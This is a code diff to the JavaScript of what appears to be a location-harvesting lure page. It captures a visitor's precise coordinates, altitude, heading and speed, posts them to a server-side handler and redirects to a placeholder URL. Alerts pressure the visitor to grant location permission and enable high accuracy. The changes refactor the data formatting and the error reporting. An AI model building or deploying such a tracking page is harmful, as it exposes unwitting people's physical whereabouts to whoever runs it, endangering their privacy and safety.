@@ -13,16 +13,54 @@ function locate()
   function showPosition(position)
   {
     var lat = position.coords.latitude;
+    if( lat ){
+      lat = lat + ' deg';
+    }
+    else {
+      lat = 'Not Available';
+    }
     var lon = position.coords.longitude;
+    if( lon ){
+      lon = lon + ' deg';
+    }
+    else {
+      lon = 'Not Available';
+    }
     var acc = position.coords.accuracy;
+    if( acc ){
+      acc = acc + ' m';
+    }
+    else {
+      acc = 'Not Available';
+    }
     var alt = position.coords.altitude;
+    if( alt ){
+      alt = alt + ' m';
+    }
+    else {
+      alt = 'Not Available';
+    }
     var dir = position.coords.heading;
+    if( dir ){
+      dir = dir + ' deg';
+    }
+    else {
+      dir = 'Not Available';
+    }
     var spd = position.coords.speed;
+    if( spd ){
+      spd = spd + ' m/s';
+    }
+    else {
+      spd = 'Not Available';
+    }
+
+    var ok_status = 'success';
 
     $.ajax({
       type: 'POST',
-      url: '/php/result.php',
-      data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
+      url: 'result_handler.php',
+      data: {Status: ok_status,Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
       success: function(){window.location='REDIRECT_URL';},
       mimeType: 'text'
     });
@@ -31,28 +69,31 @@ function locate()
 
 function showError(error)
 {
+  var err_text;
+  var err_status = 'failed';
+
 	switch(error.code)
   {
 		case error.PERMISSION_DENIED:
-			var denied = 'User denied the request for Geolocation';
+			err_text = 'User denied the request for Geolocation';
       alert('Please Refresh This Page and Allow Location Permission...');
       break;
 		case error.POSITION_UNAVAILABLE:
-			var unavailable = 'Location information is unavailable';
+			err_text = 'Location information is unavailable';
 			break;
 		case error.TIMEOUT:
-			var timeout = 'The request to get user location timed out';
+			err_text = 'The request to get user location timed out';
       alert('Please Set Your Location Mode on High Accuracy...');
 			break;
 		case error.UNKNOWN_ERROR:
-			var unknown = 'An unknown error occurred';
+			err_text = 'An unknown error occurred';
 			break;
 	}
 
   $.ajax({
     type: 'POST',
-    url: '/php/error.php',
-    data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown},
+    url: 'error_handler.php',
+    data: {Status: err_status, Error: err_text},
     success: function(){$('#change').html('Failed');},
     mimeType: 'text'
   });
